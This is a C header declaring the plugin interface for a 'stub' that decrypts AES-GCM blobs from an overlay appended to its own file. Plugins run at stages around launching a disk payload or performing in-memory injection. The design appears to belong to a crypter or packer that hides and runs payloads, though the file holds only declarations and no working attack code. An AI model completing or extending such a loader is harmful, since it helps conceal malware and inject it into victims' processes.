#pragma once
#include <stdint.h>

#define PLUGIN_MAGIC "STEPLG01"  // 8 bytes

// Stages where plugins can be executed. Order is advisory (lower runs first).
typedef enum {
    PLUGIN_STAGE_PRELAUNCH = 0, // before launching disk payload (before CreateProcess)
    PLUGIN_STAGE_PREINJECT,     // before performing any in-memory injection
    PLUGIN_STAGE_POSTLAUNCH,    // immediately after launching payload
    PLUGIN_STAGE_ONEXIT,        // when stub/process is shutting down
    PLUGIN_STAGE_ONFAIL,        // when a failure occurs (decrypt/launch error)
} PluginStage;

typedef struct {
    char id[16];          // ASCII id or GUID
    uint32_t blob_offset; // relative to overlay start
    uint32_t blob_len;    // ciphertext length
    uint8_t flags;        // reserved for future use
    uint8_t stage;        // PluginStage (one of values above)
    uint16_t order;       // ordinal within stage; lower runs first
    uint8_t iv[12];       // AES-GCM IV used for this blob (or zeroed for plaintext)
    uint8_t tag[16];      // AES-GCM tag for this blob (or zeroed for plaintext)
} PluginEntry;

// Overlay header placed at end of stub
typedef struct {
    char magic[8];         // PLUGIN_MAGIC
    uint32_t table_offset; // offset from overlay start to table
    uint32_t plugin_count; // number of PluginEntry records
} PluginOverlayHeader;

// Initialize plugin loader at runtime.
// key_hex: 64-char hex key used to decrypt plugin blobs (AES-256-GCM). May be NULL when
// blobs are stored plaintext (test builds).
// Returns 0 on success, non-zero on failure.
int plugin_loader_init(const char *key_hex);

// Fire all plugins registered for a specific stage. Called by the stub at
// appropriate lifecycle points (e.g. PRELAUNCH, POSTLAUNCH).
// Returns number of plugins successfully invoked for the stage.
int plugin_fire_stage(int stage);
